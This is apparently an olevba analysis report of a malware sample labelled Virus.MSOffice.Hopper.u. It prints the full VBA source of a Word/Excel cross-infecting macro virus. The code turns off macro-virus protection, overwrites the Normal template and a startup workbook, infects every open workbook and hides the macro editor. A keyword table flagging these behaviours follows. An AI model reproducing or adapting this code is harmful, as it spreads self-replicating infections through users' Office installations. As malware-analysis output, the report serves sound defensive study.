olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.u-93ff021e72c6c4afa7046f6bfa23ca04f26c79b2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Hopper.u-93ff021e72c6c4afa7046f6bfa23ca04f26c79b2 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'MultiSys
Private RunFlag As Boolean
Private Sub Document_Close()
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If NT.Lines(1, 1) <> "'MultiSys" Then
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
        xlsObj = GetObject(, "Excel.Application"): Quit = 0
        If xlsObj = "" Then Set xlApp = CreateObject("Excel.Application"): Quit = 1
        If UCase(Dir(xlApp.Application.StartupPath + "\cs.xls")) <> UCase("CS.XLS") Then
            xlApp.Workbooks.Add.SaveAs xlApp.Application.StartupPath & "\cs.xls"
            xlApp.Workbooks("cs.xls").VBProject.VBComponents.Item("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
            xlApp.Workbooks("cs.xls").Close SaveChanges:=True
        End If
        If Quit = 1 Then xlApp.Application.Quit
    End If
    If AD.Lines(1, 1) <> "'MultiSys" Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
End Sub
Sub ViewVBCode(): Stealth: End Sub
Sub ToolsMacro(): Stealth: End Sub
Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth(): On Error Resume Next
    ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    If UCase(Dir(Application.StartupPath + "\cs.xls")) <> "CS.XLS" And RunFlag <> True Then
        RunFlag = True
        Set WordObj = GetObject(, "Word.Application"): Quit = 0
        If WordObj = "" Then Set WordObj = CreateObject("Word.Application"): Quit = 1
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        If NT.Lines(1, 1) <> "'MultiSys" Then
            WordObj.Options.SaveNormalPrompt = False
            NT.DeleteLines 1, NT.CountOfLines
            NT.InsertLines 1, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines)
        End If
        If Quit = 1 Then WordObj.Application.Quit
        Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\cs.xls", FileFormat:=xlNormal, AddToMru:=False
        Workbooks("cs.xls").Close SaveChanges:=True
    End If
    For i = 1 To Workbooks.Count
        If Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(1, 1) <> "'MultiSys" Then
            Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.InsertLines 1, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines)
        End If
    Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSOffice.Hopper.u-93ff021e72c6c4afa7046f6bfa23ca04f26c79b2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSOffice.Hopper.u-93ff021e72c6c4afa7046f6bfa23ca04f26c79b2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSOffice.Hopper.u-93ff021e72c6c4afa7046f6bfa23ca04f26c79b2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

